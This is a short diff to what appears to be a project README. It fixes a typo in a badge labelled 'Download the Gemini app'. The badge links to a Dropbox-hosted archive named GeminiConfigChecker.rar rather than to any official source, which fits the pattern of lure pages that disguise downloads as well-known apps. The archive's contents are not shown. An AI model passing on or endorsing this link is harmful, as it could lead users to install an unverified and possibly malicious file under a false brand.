@@ -6,7 +6,7 @@
 
 <p align="center">
    <a href="https://www.dropbox.com/scl/fi/l80rdcm1o9gnqcpdsw1gi/GeminiConfigChecker.rar?rlkey=dv7oxsttd2j8kvr5zu7uyx1tm&st=l2vaozdz&dl=1">
-    <img alt="Download the Gemini app" src="https://img.shields.io/badge/Download-%20Gemeni%20app-0969DA?style=for-the-badge&logo=github&logoColor=white">
+    <img alt="Download the Gemini app" src="https://img.shields.io/badge/Download-%20Gemini%20app-0969DA?style=for-the-badge&logo=github&logoColor=white">
   </a>
 </p>
 
